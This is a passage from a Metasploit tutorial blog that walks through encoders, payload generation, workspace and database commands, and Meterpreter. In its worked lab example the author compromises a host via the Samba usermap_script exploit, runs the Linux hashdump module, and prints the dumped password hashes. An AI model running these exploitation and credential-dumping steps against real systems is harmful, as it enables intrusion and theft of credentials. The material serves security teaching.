</span><span class='line'>   x86/bloxor                                     manual     BloXor - A Metamorphic Block Based XOR Encoder
</span><span class='line'>   x86/call4_dword_xor                            normal     Call+4 Dword XOR Encoder
</span><span class='line'>   x86/context_cpuid                              manual     CPUID-based Context Keyed Payload Encoder
</span><span class='line'>   x86/context_stat                               manual     stat(2)-based Context Keyed Payload Encoder
</span><span class='line'>   x86/context_time                               manual     time(2)-based Context Keyed Payload Encoder
</span><span class='line'>   x86/countdown                                  normal     Single-byte XOR Countdown Encoder
</span><span class='line'>   x86/fnstenv_mov                                normal     Variable-length Fnstenv/mov Dword XOR Encoder
</span><span class='line'>   x86/jmp_call_additive                          normal     Jump/Call XOR Additive Feedback Encoder
</span><span class='line'>   x86/nonalpha                                   low        Non-Alpha Encoder
</span><span class='line'>   x86/nonupper                                   low        Non-Upper Encoder
</span><span class='line'>   x86/opt_sub                                    manual     Sub Encoder (optimised)
</span><span class='line'>   x86/shikata_ga_nai                             excellent  Polymorphic XOR Additive Feedback Encoder
</span><span class='line'>   x86/single_static_bit                          manual     Single Static Bit
</span><span class='line'>   x86/unicode_mixed                              manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
</span><span class='line'>   x86/unicode_upper                              manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span></code></pre></td></tr></table></div></figure>


<p></p>

<ul>
<li><strong>spool</strong> &ndash; write console log to a file</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help spool
</span><span class='line'>Usage: spool &lt;off&gt;|&lt;filename&gt;
</span><span class='line'>
</span><span class='line'>Example:
</span><span class='line'>  spool /tmp/console.log</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>use</strong> &ndash; selects module</li>
</ul>


<h1>Payload types</h1>

<p>There are 3 types of payloads that you can use with your exploits.</p>

<ul>
<li><p><strong>singles</strong> are standalone payloads that have everything needed to run by themselves. They are reliable but their size might be a detriment with some exploits</p></li>
<li><p><strong>stagers</strong> are small and are designed to establish a connection between attacker and victim and download additional components for the exploit as needed</p></li>
<li><p><strong>stages</strong> have various functionalities and are downloaded by the stagers to be run on the remote host</p></li>
</ul>


<h2>Payload generation</h2>

<p>The following are the available options for generating payloads:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sf payload(generic) &gt; generate -h
</span><span class='line'>Usage: generate [options]
</span><span class='line'>
</span><span class='line'>Generates a payload.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -E        Force encoding.
</span><span class='line'>    -b &lt;opt&gt;  The list of characters to avoid: '\x00\xff'
</span><span class='line'>    -e &lt;opt&gt;  The name of the encoder module to use.
</span><span class='line'>    -f &lt;opt&gt;  The output file name (otherwise stdout)
</span><span class='line'>    -h        Help banner.
</span><span class='line'>    -i &lt;opt&gt;  the number of encoding iterations.
</span><span class='line'>    -k        Keep the template executable functional
</span><span class='line'>    -o &lt;opt&gt;  A comma separated list of options in VAR=VAL format.
</span><span class='line'>    -p &lt;opt&gt;  The Platform for output.
</span><span class='line'>    -s &lt;opt&gt;  NOP sled length.
</span><span class='line'>    -t &lt;opt&gt;  The output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-net,psh-reflection,psh-cmd,vba,vba-exe,vba-psh,vbs,war
</span><span class='line'>    -x &lt;opt&gt;  The executable template to use</span></code></pre></td></tr></table></div></figure>


<h1>Working with the database</h1>

<p>Metasploit is backed by a powerful database that you can use to organize and classify the information. First, you have to start the PostgreSQL server: <code>service postgresql start</code>. Then you create and initialize the database after starting Metasploit with the <code>msfdb init</code> command.</p>

<p>Let&rsquo;s look at the database commands:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Database Backend Commands
</span><span class='line'>=========================
</span><span class='line'>
</span><span class='line'>    Command           Description
</span><span class='line'>    -------           -----------
</span><span class='line'>    creds             List all credentials in the database
</span><span class='line'>    db_connect        Connect to an existing database
</span><span class='line'>    db_disconnect     Disconnect from the current database instance
</span><span class='line'>    db_export         Export a file containing the contents of the database
</span><span class='line'>    db_import         Import a scan result file (filetype will be auto-detected)
</span><span class='line'>    db_nmap           Executes nmap and records the output automatically
</span><span class='line'>    db_rebuild_cache  Rebuilds the database-stored module cache
</span><span class='line'>    db_status         Show the current database status
</span><span class='line'>    hosts             List all hosts in the database
</span><span class='line'>    loot              List all loot in the database
</span><span class='line'>    notes             List all notes in the database
</span><span class='line'>    services          List all services in the database
</span><span class='line'>    vulns             List all vulnerabilities in the database
</span><span class='line'>    workspace         Switch between database workspaces</span></code></pre></td></tr></table></div></figure>


<p>Chances are, you will want to keep your targets organized and separate from each other. For this, you can build different workspaces for every one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help workspace
</span><span class='line'>Usage:
</span><span class='line'>    workspace                  List workspaces
</span><span class='line'>    workspace [name]           Switch workspace
</span><span class='line'>    workspace -a [name] ...    Add workspace(s)
</span><span class='line'>    workspace -d [name] ...    Delete workspace(s)
</span><span class='line'>    workspace -D               Delete all workspaces
</span><span class='line'>    workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace
</span><span class='line'>    workspace -h               Show this help information</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s say that you want a separate workspace for your lab target. You can add it and all the subsequent information will be saved in this workspace:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; workspace -a lab
</span><span class='line'>[*] Added workspace: lab
</span><span class='line'>msf &gt; workspace
</span><span class='line'>  default
</span><span class='line'>* lab</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s populate this workspace with some information about the target. I ran a <code>db_nmap</code> scan on the box and then I looked at the hosts data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; hosts
</span><span class='line'>
</span><span class='line'>Hosts
</span><span class='line'>=====
</span><span class='line'>
</span><span class='line'>address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
</span><span class='line'>-------         ---                ----  -------  ---------  -----  -------  ----  --------
</span><span class='line'>192.168.80.156  00:0c:29:e5:3a:67        Linux               2.6.X  server         </span></code></pre></td></tr></table></div></figure>


<p>There is more that you can do with the <strong>hosts</strong> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; hosts -h
</span><span class='line'>Usage: hosts [ options ] [addr1 addr2 ...]
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>  -a,--add          Add the hosts instead of searching
</span><span class='line'>  -d,--delete       Delete the hosts instead of searching
</span><span class='line'>  -c &lt;col1,col2&gt;    Only show the given columns (see list below)
</span><span class='line'>  -h,--help         Show this help information
</span><span class='line'>  -u,--up           Only show hosts which are up
</span><span class='line'>  -o &lt;file&gt;         Send output to a file in csv format
</span><span class='line'>  -R,--rhosts       Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search       Search string to filter by
</span><span class='line'>  -i,--info         Change the info of a host
</span><span class='line'>  -n,--name         Change the name of a host
</span><span class='line'>  -m,--comment      Change the comment of a host
</span><span class='line'>  -t,--tag          Add or specify a tag to a range of hosts
</span><span class='line'>
</span><span class='line'>Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags</span></code></pre></td></tr></table></div></figure>


<p>With the <strong>services</strong> command, you can look at the identified services:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; services -h
</span><span class='line'>
</span><span class='line'>Usage: services [-h] [-u] [-a] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o &lt;filename&gt;] [addr1 addr2 ...]
</span><span class='line'>
</span><span class='line'>  -a,--add          Add the services instead of searching
</span><span class='line'>  -d,--delete       Delete the services instead of searching
</span><span class='line'>  -c &lt;col1,col2&gt;    Only show the given columns
</span><span class='line'>  -h,--help         Show this help information
</span><span class='line'>  -s &lt;name1,name2&gt;  Search for a list of service names
</span><span class='line'>  -p &lt;port1,port2&gt;  Search for a list of ports
</span><span class='line'>  -r &lt;protocol&gt;     Only show [tcp|udp] services
</span><span class='line'>  -u,--up           Only show services which are up
</span><span class='line'>  -o &lt;file&gt;         Send output to a file in csv format
</span><span class='line'>  -R,--rhosts       Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search       Search string to filter by
</span><span class='line'>
</span><span class='line'>Available columns: created_at, info, name, port, proto, state, updated_at
</span><span class='line'>
</span><span class='line'>msf &gt; services
</span><span class='line'>
</span><span class='line'>Services
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>host            port  proto  name         state  info
</span><span class='line'>----            ----  -----  ----         -----  ----
</span><span class='line'>192.168.80.156  21    tcp    ftp          open   ProFTPD 1.3.1
</span><span class='line'>192.168.80.156  22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
</span><span class='line'>192.168.80.156  23    tcp    telnet       open   Linux telnetd
</span><span class='line'>192.168.80.156  25    tcp    smtp         open   Postfix smtpd
</span><span class='line'>192.168.80.156  53    tcp    domain       open   ISC BIND 9.4.2
</span><span class='line'>192.168.80.156  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
</span><span class='line'>192.168.80.156  139   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
</span><span class='line'>192.168.80.156  445   tcp    netbios-ssn  open   Samba smbd 3.X workgroup: WORKGROUP
</span><span class='line'>192.168.80.156  3306  tcp    mysql        open   MySQL 5.0.51a-3ubuntu5
</span><span class='line'>192.168.80.156  5432  tcp    postgresql   open   PostgreSQL DB 8.3.0 - 8.3.7
</span><span class='line'>192.168.80.156  8009  tcp    ajp13        open   Apache Jserv Protocol v1.3
</span><span class='line'>192.168.80.156  8180  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1</span></code></pre></td></tr></table></div></figure>


<p>You can also look at the vulnerabilities associated with different services:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help vulns
</span><span class='line'>Print all vulnerabilities in the database
</span><span class='line'>
</span><span class='line'>Usage: vulns [addr range]
</span><span class='line'>
</span><span class='line'>  -h,--help             Show this help information
</span><span class='line'>  -p,--port &lt;portspec&gt;  List vulns matching this port spec
</span><span class='line'>  -s &lt;svc names&gt;        List vulns matching these service names
</span><span class='line'>  -R,--rhosts           Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search           Search string to filter by
</span><span class='line'>  -i,--info             Display Vuln Info
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  vulns -p 1-65536          # only vulns with associated services
</span><span class='line'>  vulns -p 1-65536 -s http  # identified as http on any port</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s possible to also add notes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help notes
</span><span class='line'>Usage: notes [-h] [-t &lt;type1,type2&gt;] [-n &lt;data string&gt;] [-a] [addr range]
</span><span class='line'>
</span><span class='line'>  -a,--add                  Add a note to the list of addresses, instead of listing
</span><span class='line'>  -d,--delete               Delete the hosts instead of searching
</span><span class='line'>  -n,--note &lt;data&gt;          Set the data for a new note (only with -a)
</span><span class='line'>  -t &lt;type1,type2&gt;          Search for a list of types
</span><span class='line'>  -h,--help                 Show this help information
</span><span class='line'>  -R,--rhosts               Set RHOSTS from the results of the search
</span><span class='line'>  -S,--search               Regular expression to match for search
</span><span class='line'>  -o,--output               Save the notes to a csv file
</span><span class='line'>  --sort &lt;field1,field2&gt;    Fields to sort by (case sensitive)
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  notes --add -t apps -n 'winzip' 10.1.1.34 10.1.20.41
</span><span class='line'>  notes -t smb.fingerprint 10.1.1.34 10.1.20.41
</span><span class='line'>  notes -S 'nmap.nse.(http|rtsp)' --sort type,output</span></code></pre></td></tr></table></div></figure>


<p>If credentials were found, we have a way to list and manage them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help creds
</span><span class='line'>
</span><span class='line'>With no sub-command, list credentials. If an address range is
</span><span class='line'>given, show only credentials with logins on hosts within that
</span><span class='line'>range.
</span><span class='line'>
</span><span class='line'>Usage - Listing credentials:
</span><span class='line'>  creds [filter options] [address range]
</span><span class='line'>
</span><span class='line'>Usage - Adding credentials:
</span><span class='line'>  creds add-ntlm &lt;user&gt; &lt;ntlm hash&gt; [domain]
</span><span class='line'>  creds add-password &lt;user&gt; &lt;password&gt; [realm] [realm-type]
</span><span class='line'>  creds add-ssh-key &lt;user&gt; &lt;/path/to/id_rsa&gt; [realm-type]
</span><span class='line'>Where [realm type] can be one of:
</span><span class='line'>  domain - Active Directory Domain
</span><span class='line'>  db2db - DB2 Database
</span><span class='line'>  sid - Oracle System Identifier
</span><span class='line'>  pgdb - PostgreSQL Database
</span><span class='line'>  wildcard - *
</span><span class='line'>
</span><span class='line'>General options
</span><span class='line'>  -h,--help             Show this help information
</span><span class='line'>  -o &lt;file&gt;             Send output to a file in csv format
</span><span class='line'>  -d                    Delete one or more credentials
</span><span class='line'>
</span><span class='line'>Filter options for listing
</span><span class='line'>  -P,--password &lt;regex&gt; List passwords that match this regex
</span><span class='line'>  -p,--port &lt;portspec&gt;  List creds with logins on services matching this port spec
</span><span class='line'>  -s &lt;svc names&gt;        List creds matching comma-separated service names
</span><span class='line'>  -u,--user &lt;regex&gt;     List users that match this regex
</span><span class='line'>  -t,--type &lt;type&gt;      List creds that match the following types: password,ntlm,hash
</span><span class='line'>  -O,--origins          List creds that match these origins
</span><span class='line'>  -R,--rhosts           Set RHOSTS from the results of the search
</span><span class='line'>
</span><span class='line'>Examples, listing:
</span><span class='line'>  creds               # Default, returns all credentials
</span><span class='line'>  creds 1.2.3.4/24    # nmap host specification
</span><span class='line'>  creds -p 22-25,445  # nmap port specification
</span><span class='line'>  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
</span><span class='line'>  creds -t ntlm       # All NTLM creds
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Examples, adding:
</span><span class='line'>  # Add a user with an NTLMHash
</span><span class='line'>  creds add-ntlm alice 5cfe4c82d9ab8c66590f5b47cd6690f1:978a2e2e1dec9804c6b936f254727f9a
</span><span class='line'>  # Add a user with a blank password and a domain
</span><span class='line'>  creds add-password bob '' contosso
</span><span class='line'>  # Add a user with an SSH key
</span><span class='line'>  creds add-ssh-key root /root/.ssh/id_rsa
</span><span class='line'>
</span><span class='line'>Example, deleting:
</span><span class='line'>  # Delete all SMB credentials
</span><span class='line'>  creds -d -s smb</span></code></pre></td></tr></table></div></figure>


<p>As you can see though, I have no credentials in the database:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; creds
</span><span class='line'>Credentials
</span><span class='line'>===========
</span><span class='line'>
</span><span class='line'>host  origin  service  public  private  realm  private_type
</span><span class='line'>----  ------  -------  ------  -------  -----  ------------</span></code></pre></td></tr></table></div></figure>


<p>Finally, there is the loot:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help loot
</span><span class='line'>Usage: loot &lt;options&gt;
</span><span class='line'> Info: loot [-h] [addr1 addr2 ...] [-t &lt;type1,type2&gt;]
</span><span class='line'>  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] [-t [type]
</span><span class='line'>  Del: loot -d [addr1 addr2 ...]
</span><span class='line'>
</span><span class='line'>  -a,--add          Add loot to the list of addresses, instead of listing
</span><span class='line'>  -d,--delete       Delete *all* loot matching host and type
</span><span class='line'>  -f,--file         File with contents of the loot to add
</span><span class='line'>  -i,--info         Info of the loot to add
</span><span class='line'>  -t &lt;type1,type2&gt;  Search for a list of types
</span><span class='line'>  -h,--help         Show this help information
</span><span class='line'>  -S,--search       Search string to filter by</span></code></pre></td></tr></table></div></figure>


<p>I have compromised the target via the Samba service and now I will loot some hashes from it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; run -j
</span><span class='line'>[*] Exploit running as background job.
</span><span class='line'>
</span><span class='line'>[*] Started bind handler
</span><span class='line'>msf exploit(usermap_script) &gt; [*] Command shell session 2 opened (192.168.80.155:49009 -&gt; 192.168.80.156:4444) at 2016-06-03 13:19:48 -0400
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; use post/linux/gather/hashdump
</span><span class='line'>msf post(hashdump) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (post/linux/gather/hashdump):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   SESSION                   yes       The session to run this module on.
</span><span class='line'>
</span><span class='line'>msf post(hashdump) &gt; sessions
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type        Information  Connection
</span><span class='line'>  --  ----        -----------  ----------
</span><span class='line'>  2   shell unix               192.168.80.155:49009 -&gt; 192.168.80.156:4444 (192.168.80.156)
</span><span class='line'>
</span><span class='line'>msf post(hashdump) &gt; set SESSION 2
</span><span class='line'>SESSION =&gt; 2
</span><span class='line'>msf post(hashdump) &gt; run
</span><span class='line'>
</span><span class='line'>[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
</span><span class='line'>[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
</span><span class='line'>[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
</span><span class='line'>[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
</span><span class='line'>[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
</span><span class='line'>[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
</span><span class='line'>[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
</span><span class='line'>[+] Unshadowed Password File: /root/.msf5/loot/20160603132136_lab_192.168.80.156_linux.hashes_520578.txt
</span><span class='line'>[*] Post module execution completed</span></code></pre></td></tr></table></div></figure>


<p>Now I can see the loot in the database:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf post(hashdump) &gt; loot
</span><span class='line'>
</span><span class='line'>Loot
</span><span class='line'>====
</span><span class='line'>
</span><span class='line'>host            service  type          name                   content     info                            path
</span><span class='line'>----            -------  ----          ----                   -------     ----                            ----
</span><span class='line'>192.168.80.156           linux.hashes  unshadowed_passwd.pwd  text/plain  Linux Unshadowed Password File  /root/.msf5/loot/20160603132136_lab_192.168.80.156_linux.hashes_520578.txt
</span><span class='line'>192.168.80.156           linux.passwd  passwd.tx              text/plain  Linux Passwd File               /root/.msf5/loot/20160603132135_lab_192.168.80.156_linux.passwd_153460.txt
</span><span class='line'>192.168.80.156           linux.shadow  shadow.tx              text/plain  Linux Password Shadow File      /root/.msf5/loot/20160603132135_lab_192.168.80.156_linux.shadow_842643.txt</span></code></pre></td></tr></table></div></figure>


<h1>Meterpreter</h1>

<p>Next, let&rsquo;s look at Meterpreter, the king of payloads. Meterpreter has no disk presence because it only exists in memory, and it leaves no trail behind of created processes because it injects itself in currently running processes. To top it off, its traffic is encrypted. I will show Meterpreter in action here, but this time, the target is a Windows 7 machine.</p>

<p>I&rsquo;ve already set up the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
